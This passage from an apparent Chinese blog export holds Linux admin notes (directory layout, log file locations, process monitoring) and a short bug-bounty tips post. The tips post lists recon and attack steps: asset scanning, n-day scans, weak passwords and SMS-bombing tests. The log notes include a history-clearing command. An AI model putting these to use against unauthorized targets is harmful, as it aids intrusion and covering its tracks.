<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..9&#125;;<span class="keyword">do</span></span><br><span class="line"> <span class="keyword">for</span>((j=<span class="number">1</span>;j&lt;=i;j++));<span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -en <span class="string">&quot;<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="subst">$(($i*$j)</span>)\t&quot;</span></span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> &#123;1..9&#125;;<span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> &#123;0..9&#125;;<span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> &#123;0..9&#125;;<span class="keyword">do</span></span><br><span class="line">            number1=$((a*<span class="number">100</span>+b*<span class="number">10</span>+c))</span><br><span class="line">            number2=$((a**<span class="number">3</span>+b**<span class="number">3</span>+c**<span class="number">3</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$number1</span> -eq <span class="variable">$number2</span>; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Found number <span class="variable">$number1</span>&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux进阶</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【SRC】众测思路</title>
    <url>/posts/2dc80bc0/</url>
    <content><![CDATA[<p>雷神众测 需要技术 有基础再参加 不然号废了 钱少通过率可以<br>
360众测 要先打靶场 钱多 通过率低 重复率高 不推荐漏洞盒子 需要积分补天<br>
EDU众测 钱很少 不难火线众测 银行众测 快凉了</p>
<p>众测思路看手速 收录范围广</p>
<p>众测厂商等级银行证券：难政府、EDU、企业：中等私人项目：简单（捡钱，认识项目经理）</p>
<p>fofa、hunter到处资产 扫指纹 定位oa和框架 扫nday<br>
arl边跑边测，怼着后台和功能</p>
<p>思路（不太常规，别人不太会用）利用icon收集信息查找网站的真是ip 挖网站的c端（比较容易歪） 不确定可以问问利用站点标题进行模糊搜索公众号小程序 关键词搜索谷歌/bing语法：很多玉米螟需要正确路径才能打开，不然40X</p>
<p>漏洞挖掘<br>
nday 扫框架 组件漏洞未授权 弱口令逻辑漏洞短信轰炸（看能不能并发）</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>渗透思路</category>
      </categories>
  </entry>
  <entry>
    <title>【Linux】Linux总结（待完善）</title>
    <url>/posts/2c8b313c/</url>
    <content><![CDATA[<h2 id="文件系统介绍">文件系统介绍</h2>
<h3 id="根目录结构及其功能">根目录结构及其功能</h3>
<p><strong>系统目录结构：</strong></p>
<table>
<thead>
<tr>
<th>目录</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>bin</strong></td>
<td><strong>目录全称(binary) 存放二进制命令文件(普通用户可以使用)</strong></td>
</tr>
<tr>
<td>sbin</td>
<td>目录存放二进制命令文件(root用户可以使用)</td>
</tr>
<tr>
<td><strong>etc</strong></td>
<td><strong>目录存放软件程序或系统程序配置文件</strong></td>
</tr>
<tr>
<td>lib</td>
<td>目录会存放需要调取库文件信息 旧软件程序调取库文件</td>
</tr>
<tr>
<td>lib64</td>
<td>目录会存放需要调取库文件信息 新软件程序调取库文件</td>
</tr>
<tr>
<td>media</td>
<td>可以存放实例视频或图片 可以用于作为默认挂载点</td>
</tr>
<tr>
<td>mnt</td>
<td>可以用于作为默认挂载点</td>
</tr>
<tr>
<td>opt</td>
<td>目录存放第三方软件程序数据 等价于Windows program files</td>
</tr>
<tr>
<td>usr</td>
<td>目录存放第三方软件程序数据 等价于Windows program files</td>
</tr>
<tr>
<td><strong>root</strong></td>
<td><strong>用户信息存放家目录 root用户的家 ~</strong></td>
</tr>
<tr>
<td>home</td>
<td>用户信息存放家目录 普通用户的家~</td>
</tr>
<tr>
<td>boot</td>
<td>目录存放系统启动相关的数据</td>
</tr>
<tr>
<td><strong>dev</strong></td>
<td><strong>目录会存放一些设备文件信息</strong></td>
</tr>
<tr>
<td><strong>var</strong></td>
<td><strong>目录全称(variable),用于存放日志文件的</strong></td>
</tr>
<tr>
<td>tmp</td>
<td>目录用于临时存放文件信息 类似于Windows 回收站</td>
</tr>
<tr>
<td><strong>proc</strong></td>
<td><strong>由内核组成，目录中会存放系统内核配置信息或服务进程信息，不会占用磁盘空间，只会占用内存空间</strong></td>
</tr>
</tbody>
</table>
<h3 id="系统配置信息">系统配置信息</h3>
<table>
<thead>
<tr>
<th>文件</th>
<th>路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>网卡配置（centos）</td>
<td>/etc/sysconfig/network-scripts/ifcfg-ens33<br>/etc/sysconfig/network-scripts/ifcfg-eth0</td>
</tr>
<tr>
<td>网卡配置（kali）</td>
<td>/etc/systemd/networkd.conf</td>
</tr>
<tr>
<td>主机名</td>
<td>/etc/hostname</td>
</tr>
<tr>
<td>域名配置文件</td>
<td>/etc/resolv.conf</td>
</tr>
<tr>
<td>环境变量</td>
<td>/etc/profile<br>/etc/bashrc<br>~/.bash_profile <br>~/.bashrc</td>
</tr>
<tr>
<td>开机自动加载命令文件</td>
<td>/etc/rc.d/rc.local</td>
</tr>
<tr>
<td>用户登录信息提示文件</td>
<td>/etc/motd</td>
</tr>
<tr>
<td>系统版本信息</td>
<td>/etc/[redhat/centos/os(kali是os)]-release</td>
</tr>
<tr>
<td>用户相关文件信息</td>
<td>/etc/passwd</td>
</tr>
<tr>
<td>cpu相关信息，包括型号、主频、内核信息等</td>
<td>/proc/cpuinfo</td>
</tr>
<tr>
<td>操作系统版本信息</td>
<td>/proc/version</td>
</tr>
<tr>
<td>系统全局 cron 配置文件</td>
<td>/etc/crontab</td>
</tr>
<tr>
<td>docker配置文件</td>
<td></td>
</tr>
<tr>
<td>nginx配置文件</td>
<td></td>
</tr>
<tr>
<td>nginx启动文件</td>
<td></td>
</tr>
<tr>
<td>配置函数信息的文件</td>
<td>/etc/init.d/functions</td>
</tr>
<tr>
<td></td>
<td>/etc/docker/daemon.json</td>
</tr>
<tr>
<td>docker代理配置文件</td>
<td>/etc/systemd/system/docker.service.d/http-proxy.conf</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>目录</th>
<th>路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>自动加载运行脚本目录</td>
<td>/etc/profile.d/</td>
</tr>
<tr>
<td>系统安装软件目录(rpm 手动方式 yum 自动方式)</td>
<td></td>
</tr>
<tr>
<td>存放独立 cron 配置文件的目录</td>
<td>/etc/cron.d/</td>
</tr>
<tr>
<td>每个用户的 cron 表存储目录</td>
<td>/var/spool/cron/</td>
</tr>
</tbody>
</table>
<h3 id="日志信息">日志信息</h3>
<p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们 需要的信息。</p>
<ol>
<li class="lvl-3">
<p>内核及系统日志由系统服务rsyslog统一进行管理，日志格式基本相似</p>
</li>
<li class="lvl-3">
<p>用户日志记录系统用户登录及退出系统的相关信息</p>
</li>
<li class="lvl-3">
<p>程序日志由相应的应用程序进行独立管理。如：web服务，ftp服务 常见日志文件</p>
</li>
</ol>
<table>
<thead>
<tr>
<th><strong>日志文件</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>/var/log/secure</strong></td>
<td><strong>登录日志。记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录， 比如 SSH登录， su登录，切换用户， sudo授权，甚至添加用户和修 改用户密码都会记录在这 个日志文件中。新版的ubuntu、debian、kali已经没有这个文件了 ， 换成了 /var/log/auth.log</strong></td>
</tr>
<tr>
<td>/var/log/message</td>
<td>通用的系统活动日志。记录内核消息、系统服务（邮件、cron等）的常规信息、非关键网络错误等。</td>
</tr>
<tr>
<td>/var/log/cron</td>
<td>每当cron进程开始一个工作时，就 会将相关信息记录在这个 文件中。</td>
</tr>
<tr>
<td>/var/log/syslog</td>
<td>所有系统活动信息（比 <code>messages</code> 更全面）。包含内核、服务、应用等除认证外的所有信息。</td>
</tr>
<tr>
<td><strong>/var/log/wtmp</strong></td>
<td><strong>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、 关机事件。同样这个文件也是一个二进制文件，不能直接编辑查看， 而需要使用 last命令来查看</strong></td>
</tr>
<tr>
<td><strong>/var/run/utmp</strong></td>
<td><strong>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不 断变化，只记录当前登录用户的信息。同样这个文件不能直接编辑查 看，而要使用 w,who,users等命令来查询</strong></td>
</tr>
<tr>
<td><strong>/var/log/btmp</strong></td>
<td><strong>记录所有失败登录日志信息。这个文件是二进制文件，不能直接编辑 查看，使用 lastb命令或 last -f /var/log/btmp 命令可以查看btmp文件。</strong></td>
</tr>
<tr>
<td>/var/log/cups</td>
<td>涉及所有打印信息的日志。</td>
</tr>
<tr>
<td>/var/log/faillog</td>
<td>包含用户登录失败信息。此外，错误登录命令也会记录在本文件中</td>
</tr>
<tr>
<td>/var/log/messages</td>
<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大 多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日 志文件。此外， mail，cron，daemon，kern和auth等内容也记录在var/log/messages</td>
</tr>
<tr>
<td>/var/log/dmesg</td>
<td>包含内核缓冲信息（ kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用 dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td><strong>/var/log/auth.log</strong></td>
<td><strong>包含系统授权信息，包括用户登录和使用的权限机制等。</strong></td>
</tr>
<tr>
<td>/var/log/boot.log</td>
<td>包含系统启动时的日志。</td>
</tr>
<tr>
<td>/var/log/daemon.log</td>
<td>包含各种系统后台守护进程日志信息。</td>
</tr>
<tr>
<td>/var/log/dpkg.log</td>
<td>包括安装或 dpkg命令清除软件包的日志。</td>
</tr>
<tr>
<td>/var/log/kern.log</td>
<td>包含内核产生的日志，有助于在定制内核时解决问题。</td>
</tr>
<tr>
<td><strong>/var/log/lastlog</strong></td>
<td><strong>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文 件，不能直接编辑查看，而要使用 lastlog命令查看</strong></td>
</tr>
<tr>
<td>/var/log/user.log</td>
<td>记录所有等级用户信息的日志。</td>
</tr>
<tr>
<td>/var/log/alternatives.log</td>
<td>更新替代信息都记录在这个文件中。</td>
</tr>
<tr>
<td>/var/log/anaconda.log</td>
<td>在安装Linux时，所有安装信息都储存在这个文件中。</td>
</tr>
<tr>
<td>/var/log/yum.log</td>
<td>包含使用 yum安装的软件包信息。</td>
</tr>
<tr>
<td>/var/log/maillog<br>/var/log/mail.log</td>
<td>包含系统运行电子邮件服务器的日志信息。例如， sendmail日志信息就全部送到这个 文件中</td>
</tr>
</tbody>
</table>
<p>比较重要的几个日志：</p>
<blockquote>
<p>登录失败记录：/var/log/btmp    #lastb<br>
最后一次登录：/var/log/lastlog #lastlog<br>
登录成功记录: /var/log/wtmp    #last<br>
登录日志记录：/var/log/secure<br>
目前登录用户信息：/var/run/utmp #w、who、users<br>
历史命令记录：history<br>
仅清理当前用户：history -c</p>
</blockquote>
<h3 id="网卡配置">网卡配置</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line"><span class="comment"># 网络接口类型（通常为 Ethernet 或 Bridge）</span></span><br><span class="line">TYPE=Ethernet</span><br><span class="line"><span class="comment"># 代理配置方式（none 表示不使用代理）</span></span><br><span class="line">PROXY_METHOD=none</span><br><span class="line"><span class="comment"># 是否仅用于浏览器代理（no 表示不限制）</span></span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line"><span class="comment"># 获取IP地址的方式（static 表示静态IP，dhcp 表示动态获取）</span></span><br><span class="line">BOOTPROTO=static</span><br><span class="line"><span class="comment"># 静态IP地址（需根据实际网络规划设置）</span></span><br><span class="line">IPADDR=10.0.0.5</span><br><span class="line"><span class="comment"># 子网掩码（定义IP地址的网络部分）</span></span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line"><span class="comment"># 默认网关（路由器的IP地址）</span></span><br><span class="line">GATEWAY=10.0.0.254</span><br><span class="line"><span class="comment"># 主DNS服务器地址（注意：此处错误添加了域名，应仅保留IP）</span></span><br><span class="line">DNS1=10.0.0.254</span><br><span class="line"><span class="comment"># 是否启用默认路由（yes 启用）</span></span><br><span class="line">DEFROUTE=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># IPv4配置失败时是否视为严重错误（no 表示不终止网络服务）</span></span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line"><span class="comment"># 是否初始化IPv6（yes 启用）</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># 是否自动配置IPv6地址（yes 启用）</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># 是否启用IPv6默认路由（yes 启用）</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># IPv6配置失败时是否视为严重错误（no 表示不终止网络服务）</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line"><span class="comment"># IPv6地址生成模式（增强隐私保护）</span></span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"><span class="comment"># 网络连接名称（自定义标识）</span></span><br><span class="line">NAME=ens33</span><br><span class="line"><span class="comment"># 设备唯一标识符（系统自动生成，通常无需修改）</span></span><br><span class="line">UUID=27a73818-89f3-4991-9890-2da7924a73c4</span><br><span class="line"><span class="comment"># 物理设备名称（需与网卡实际名称一致）</span></span><br><span class="line">DEVICE=ens33</span><br><span class="line"><span class="comment"># 是否在系统启动时激活此连接（yes 启用）</span></span><br><span class="line">ONBOOT=<span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
<p>更改配置需要重启网卡<code>systemctl restart network</code>  或 <code>service network restart</code></p>
<h3 id="域名解析配置">域名解析配置</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/resolv.conf    <span class="comment">#域名解析配置文件</span></span><br><span class="line">nameserver 10.0.0.254   <span class="comment">#DNS服务器，不能写错 写错就访问不了了</span></span><br><span class="line"><span class="built_in">cat</span> /cat /etc/hosts     <span class="comment">#访问内网的域名配置文件</span></span><br></pre></td></tr></table></figure>
<h2 id="系统管理">系统管理</h2>
<h3 id="环境变量">环境变量</h3>
<p>和变量 环境变量 别名相关的配置文件信息：<code>/etc/profile</code>、<code>/etc/bashrc</code>、<code>~/.bash_profile</code> 、<code>~/.bashrc</code>、<code>/etc/profile.d/</code></p>
<p>网安关注应急效应，异常占用资源、进程关闭后再次运行，有可能是 profile 被植入脚本运行命令。<code>/etc/profile</code> 、<code>/etc/bashrc</code>、两个文件写到任意一个都会受到影响（把某个恶意跑进程的脚本放进去）。局部变量优于全局变量</p>
<p>如果想让变量重启后仍然有效就修改这些文件。</p>
<h3 id="其他"><strong>其他</strong></h3>
<p><strong>文件时间信息分类</strong></p>
<table>
<thead>
<tr>
<th>文件时间信息分类</th>
<th>英文全称</th>
<th>缩写</th>
<th>触发条件</th>
</tr>
</thead>
<tbody>
<tr>
<td>文件修改时间</td>
<td>modified time</td>
<td>mtime</td>
<td>文件信息内容发生变动时，会修改调整此时间信息</td>
</tr>
<tr>
<td>文件访问时间</td>
<td>access time</td>
<td>atime</td>
<td>文件信息内容被访问读取时，会修改调整此时间信息</td>
</tr>
<tr>
<td>文件改变时间</td>
<td>change time</td>
<td>ctime</td>
<td>文件属性信息发生变动时，会修改调整此时间信息</td>
</tr>
</tbody>
</table>
<p><strong>inode与block</strong></p>
<p>文件索引-inode 数据信息索引 每创建一个文件可用的索引次数就会减少</p>
<p>文件大小-block 数据信息容量 文件中的信息内容不断添加，数据块就会不断减少</p>
<p>查看相关信息：</p>
<p>df -i --inode 可用数为0 表示磁盘空间不足</p>
<p>df  block 可用数 为0 表示磁盘空间不足</p>
<p>inode：默认大小为128或者256字节</p>
<p>block：默认大小1-4kb</p>
<p>由于磁盘分区都比较大，所以一个磁盘中会创建出大量的inode和block</p>
<p>本质上有数字编号和实际存储空间对应 便于检索数据信息 —指针 库管 会议 仓库提货过程</p>
<p>存储的数据文件中包含数据文件属性</p>
<p>描述数据的数据 – 元数据</p>
<h3 id="系统进程">系统进程</h3>
<p>程序（Program）是经开发编译后形成的静态可执行代码集合，是数据与指令的有序封装（如磁盘中存储的<code>wechat.exe</code>或<code>nginx</code>二进制文件），其生命周期独立于运行状态，可长期保存在存储介质中。</p>
<p>当程序被加载到内存并开始执行时，便转化为<strong>进程（Process）</strong>—— 它是程序的动态运行实例。此时，操作系统会为其分配专属的系统资源（如内存空间、CPU 时间片、文件描述符等），并记录其运行状态（如就绪、运行、阻塞等）。同时，进程会关联明确的所属用户，受系统权限管控。</p>
<p>简言之，程序是 “静态的代码文件”，而进程是 “动态的执行过程”。例如，双击<code>wechat.exe</code>后，操作系统将其加载到内存并启动执行，此时任务管理器中显示的 “微信” 进程，便是该程序的运行实例。</p>
<h4 id="进程与程序的本质区别">进程与程序的本质区别</h4>
<table>
<thead>
<tr>
<th>维度</th>
<th>程序（Program）</th>
<th>进程（Process）</th>
</tr>
</thead>
<tbody>
<tr>
<td>存在形态</td>
<td>静态：以二进制文件、脚本等形式存储于磁盘</td>
<td>动态：加载到内存中执行的指令流与数据集合</td>
</tr>
<tr>
<td>资源关联</td>
<td>不占用系统运行时资源（仅占用存储资源）</td>
<td>占用 CPU、内存、I/O 等实时系统资源</td>
</tr>
<tr>
<td>生命周期</td>
<td>长期存在（除非主动删除文件）</td>
<td>随执行开始而创建，随任务完成或异常终止而消亡（有明确生命周期）</td>
</tr>
<tr>
<td>核心属性</td>
<td>仅包含代码逻辑与静态数据</td>
<td>包含运行状态、资源句柄、进程 ID（PID）、所属用户等动态元信息</td>
</tr>
</tbody>
</table>
<p>理解进程与程序的区别，是系统运维的基础：程序是 “待执行的蓝图”，而进程是 “正在施工的现场”—— 运维的核心工作，正是通过监控、管理这些 “现场”，确保系统按预期稳定运行。</p>
<p>根据进程生命周期，存在两种特殊进程情况：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>僵尸进程：</p>
</li>
</ul>
<p>异常进程 任务没处理完子进程崩溃了，就会出现僵尸进程（Z） 儿子死了父亲还在 关注 木马病毒 产生大量Z 会占用大量内存资源</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>孤儿进程：</p>
</li>
</ul>
<p>异常进程 任务处理完毕告知父进程时，父进程异常了，产生孤儿进程，系统会自动回收孤儿进程 了解</p>
<h4 id="查看当前静态进程情况"><strong>查看当前静态进程情况</strong></h4>
<p><strong><code>ps -ef</code>|<code>ps aux</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux   <span class="comment">#USER, PID, %CPU, %MEM, VSZ, RSS, TTY, STAT, START, TIME, COMMAND</span></span><br><span class="line">ps -ef   <span class="comment">#UID, PID, PPID, C, STIME, TTY, TIME, CMD</span></span><br></pre></td></tr></table></figure>
<p>以下是 <code>ps aux</code> 和 <code>ps -ef</code> 命令中所有列的英文缩写及含义对照表：</p>
<table>
<thead>
<tr>
<th>英文缩写</th>
<th>含义说明</th>
<th>出现命令</th>
</tr>
</thead>
<tbody>
<tr>
<td>USER</td>
<td>进程所属的用户名（用户标识，字符串形式）</td>
<td>ps aux</td>
</tr>
<tr>
<td>PID</td>
<td>Process ID，进程唯一标识符（进程 ID）</td>
<td>ps aux、ps -ef</td>
</tr>
<tr>
<td>%CPU</td>
<td>进程占用的 CPU 资源百分比（单位：%）</td>
<td>ps aux</td>
</tr>
<tr>
<td>%MEM</td>
<td>进程占用的物理内存百分比（单位：%）</td>
<td>ps aux</td>
</tr>
<tr>
<td>VSZ</td>
<td>Virtual Set Size，虚拟内存大小（单位：KB，包含物理内存和交换空间等）</td>
<td>ps aux</td>
</tr>
<tr>
<td>RSS</td>
<td>Resident Set Size，实际占用的物理内存大小（单位：KB，不包含交换空间）</td>
<td>ps aux</td>
</tr>
<tr>
<td>TTY</td>
<td>进程关联的终端设备（<code>?</code> 表示无终端关联，通常为后台进程）</td>
<td>ps aux、ps -ef</td>
</tr>
<tr>
<td>STAT</td>
<td>Process State，进程状态（如 R 运行、S 睡眠、Z 僵尸、T 停止等）</td>
<td>ps aux</td>
</tr>
<tr>
<td>START</td>
<td>进程启动的时间（格式随系统时间范围变化，如时分、月日等）</td>
<td>ps aux</td>
</tr>
<tr>
<td>TIME</td>
<td>进程累计占用的 CPU 时间（格式：时：分: 秒）</td>
<td>ps aux、ps -ef</td>
</tr>
<tr>
<td>COMMAND</td>
<td>启动进程的完整命令及参数</td>
<td>ps aux</td>
</tr>
<tr>
<td>UID</td>
<td>User ID，进程所属用户的 ID（用户标识，数字形式）</td>
<td>ps -ef</td>
</tr>
<tr>
<td>PPID</td>
<td>Parent Process ID，父进程的 ID（标识当前进程的父进程）</td>
<td>ps -ef</td>
</tr>
<tr>
<td>C</td>
<td>CPU 使用率（整数形式，反映进程近期的 CPU 占用情况，精度低于 % CPU）</td>
<td>ps -ef</td>
</tr>
<tr>
<td>STIME</td>
<td>进程启动的时间（格式更紧凑，通常为时分或月日，随系统时间范围变化）</td>
<td>ps -ef</td>
</tr>
<tr>
<td>CMD</td>
<td>启动进程的命令及参数（可能因长度限制被截断）</td>
<td>ps -ef</td>
</tr>
</tbody>
</table>
<h4 id="查看当前动态进程情况">查看当前动态进程情况</h4>
<p><code>top</code> 输出分为 <strong>系统全局状态区</strong> 与 <strong>进程详情区</strong>，两者共同构成系统实时运行快照。</p>
<p>在 Linux 系统运维中，<code>top</code> 命令是实时监控进程资源与系统性能的核心工具。它通过动态刷新的界面，提供 CPU、内存、进程状态等关键指标，帮助管理员快速定位资源瓶颈与异常进程。</p>
<p>top与 ps 命令的核心差异：</p>
<table>
<thead>
<tr>
<th>工具</th>
<th>特性</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ps</code></td>
<td>静态快照，捕获某一时刻的进程状态（如 <code>ps -aux</code>）。</td>
<td>记录历史状态、排查进程启动参数。</td>
</tr>
<tr>
<td><code>top</code></td>
<td>动态监控，实时刷新资源占用与进程行为（默认 3 秒 / 次）。</td>
<td>实时性能分析、异常进程定位。</td>
</tr>
</tbody>
</table>
<h5 id="系统全局状态区">系统全局状态区</h5>
<p>系统全局状态区为输出的上半部分，以典型输出为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">top - 09:27:45 up 5 days,  7:45,  4 <span class="built_in">users</span>,  load average: 0.00, 0.01, 0.05  </span><br><span class="line">Tasks: 123 total,   1 running, 121 sleeping,   1 stopped,   0 zombie  </span><br><span class="line">%Cpu(s):  0.1 us,  0.0 sy,  0.0 ni, 99.9 <span class="built_in">id</span>,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st  </span><br><span class="line">KiB Mem :  1863032 total,  1121288 free,   256980 used,   484764 buff/cache  </span><br><span class="line">KiB Swap:  1535996 total,  1535996 free,        0 used.  1408888 avail Mem  </span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p><strong>第一行（系统基础信息）</strong></p>
<ul class="lvl-2">
<li class="lvl-5">
<p><code>09:27:45</code>：当前系统时间。</p>
</li>
<li class="lvl-5">
<p><code>up 5 days, 7:45</code>：系统已连续运行 5 天 7 小时 45 分钟（未重启）。</p>
</li>
<li class="lvl-5">
<p><code>4 users</code>：当前登录用户数（含本地终端与远程连接）。</p>
</li>
<li class="lvl-5">
<pre><code class="language-bash">load average: 0.00, 0.01, 0.05
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     ：系统平均负载，分别对应过去 <span class="number">1</span> 分钟、<span class="number">5</span> 分钟、<span class="number">15</span> 分钟的活跃进程数。</span><br><span class="line"></span><br><span class="line">     - **关键逻辑**：负载值代表处于 **可运行状态（`R`）** 或 **不可中断休眠状态（`D`）** 的进程数平均值。</span><br><span class="line">     - **健康指标**：若 <span class="number">1</span> 分钟负载值超过 CPU 核心数（如 <span class="number">4</span> 核 CPU 负载 &gt;<span class="number">4</span>），表明系统短期过载；若 <span class="number">15</span> 分钟负载持续偏高，需排查长期资源瓶颈。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. **第二行（进程总数统计）**</span><br><span class="line"></span><br><span class="line">   - `123 total`：系统总进程数。</span><br><span class="line">   - `1 running`：处于 `R` 状态的进程数（正在占用或等待 CPU）。</span><br><span class="line">   - `121 sleeping`：处于 `S`（可中断休眠）或 `D`（不可中断休眠）状态的进程数。</span><br><span class="line">   - `1 stopped`：处于 `T`（停止）状态的进程数（如被 `Ctrl+z` 暂停的 `ping` 进程）。</span><br><span class="line">   - `0 zombie`：僵尸进程（`Z` 状态）数量，若大于 <span class="number">0</span> 需检查父进程是否未回收资源。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. **第三行（CPU 资源占用）**</span><br><span class="line"></span><br><span class="line">   - **`us`：用户态进程占用 CPU 的百分比（如应用程序）**。</span><br><span class="line">   - `sy`：内核态进程占用 CPU 的百分比（如系统调用、进程调度）。</span><br><span class="line">   - `ni`：调整过优先级（`nice` 值非 <span class="number">0</span>）的用户态进程占用 CPU 的百分比。</span><br><span class="line">   - `id`：CPU 空闲百分比（数值越高，系统越空闲）。</span><br><span class="line">   - **`wa`：CPU 等待 I/O 操作（如磁盘读写）的百分比，若长期高于 <span class="number">5</span>% 需排查存储性能。**</span><br><span class="line">   - `hi`：硬中断（如硬件设备触发的中断）占用 CPU 的百分比。</span><br><span class="line">   - `si`：软中断（如内核定时器、网络数据包处理）占用 CPU 的百分比。</span><br><span class="line">   - `st`：虚拟化环境中，物理 CPU 被其他虚拟机占用的百分比（`st` 过高可能意味着宿主机资源竞争）。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. **第四、五行（内存与交换分区）**</span><br><span class="line"></span><br><span class="line">   - `KiB Mem`（物理内存）：</span><br><span class="line">     - `total`：总容量；`free`：完全空闲内存；`used`：进程直接占用内存；`buff/cache`：磁盘缓存（可释放供其他进程使用）。</span><br><span class="line">   - `KiB Swap`（虚拟内存）：</span><br><span class="line">     - `avail Mem`：新进程可使用的总内存（含 `free` 及可释放的 `buff/cache`）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 进程详情区（下半部分）</span><br><span class="line"></span><br><span class="line">以典型输出为例：</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND  </span><br><span class="line"><span class="number">53720</span> root      <span class="number">20</span>   <span class="number">0</span>       <span class="number">0</span>      <span class="number">0</span>      <span class="number">0</span> S   <span class="number">0.3</span>  <span class="number">0.0</span>   <span class="number">0</span>:<span class="number">18.08</span> kworker/<span class="number">1</span>:<span class="number">1</span>  </span><br><span class="line"><span class="title">    1 root      20   0  202396   7300   4184 S   0.0  0.4   5:</span><span class="number">01.00</span> systemd  </span><br><span class="line"><span class="title">    2 root      20   0       0      0      0 S   0.0  0.0   0:</span><span class="number">00.93</span> kthreadd  </span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
</ol>
<p><strong>字段说明：</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>PID</code></td>
<td>进程唯一标识，操作进程的核心索引（如 <code>kill 53720</code>）。</td>
</tr>
<tr>
<td><code>USER</code></td>
<td>进程所属用户，用于权限追溯（如 <code>root</code> 进程通常拥有更高权限）。</td>
</tr>
<tr>
<td><code>PR</code></td>
<td>进程调度优先级（范围 0-39，值越低优先级越高，内核动态调整）。</td>
</tr>
<tr>
<td><code>NI</code></td>
<td><code>nice</code> 值（优先级偏移量，范围 -20~19，值越低优先级越高，用户可通过 <code>nice</code> 命令调整）14。</td>
</tr>
<tr>
<td><code>VIRT</code></td>
<td>进程占用的虚拟内存总量（包括物理内存、交换分区、未使用的分配内存），类似 “建筑面积”。</td>
</tr>
<tr>
<td><code>RES</code></td>
<td>进程实际使用的物理内存（不包括交换分区），类似 “实际使用面积”。</td>
</tr>
<tr>
<td><code>SHR</code></td>
<td>进程共享的内存量（如动态链接库），类似 “公摊面积”。</td>
</tr>
<tr>
<td><code>S</code></td>
<td>进程状态（<code>R</code> 运行、<code>S</code> 休眠、<code>T</code> 停止、<code>Z</code> 僵尸等）。</td>
</tr>
<tr>
<td><code>%CPU</code></td>
<td>进程占用 CPU 的百分比（过去 3 秒内的平均值）。</td>
</tr>
<tr>
<td><code>%MEM</code></td>
<td>进程占用物理内存的百分比（相对于总物理内存）。</td>
</tr>
<tr>
<td><code>TIME+</code></td>
<td>进程累计占用的 CPU 时间（精确到 0.01 秒）。</td>
</tr>
<tr>
